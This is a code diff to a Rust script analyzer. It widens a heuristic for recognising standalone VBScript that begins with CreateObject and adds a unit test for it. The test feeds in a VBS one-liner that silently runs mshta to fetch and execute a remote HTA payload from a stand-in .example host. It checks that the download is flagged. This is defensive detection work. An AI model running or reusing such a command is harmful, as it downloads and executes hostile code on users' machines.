@@ -3492,6 +3492,8 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || (first.starts_with("const ") && !looks_like_js_script(lower))
         || (first.starts_with("set ") && first.contains("createobject"))
         || (first.starts_with("with ") && first.contains("createobject"))
+        || first.starts_with("createobject(")
+        || first.starts_with("createobject (")
         || ((first.starts_with("execute ")
             || first.starts_with("execute(")
             || first.starts_with("executeglobal ")
@@ -16747,6 +16749,30 @@ End With"#;
             report
                 .deobfuscated
                 .contains("With CreateObject(\"MSXML2.XMLHTTP\")\n.Open"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_createobject_run_prefix_url_extracted() {
+        let vbs = br#"CreateObject("WScript.Shell").Run "mshta https://standalone-vbs-direct-createobject.example/payload.hta", 0, False"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-direct-createobject.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with direct CreateObject prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("CreateObject(\"WScript.Shell\").Run"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
         );
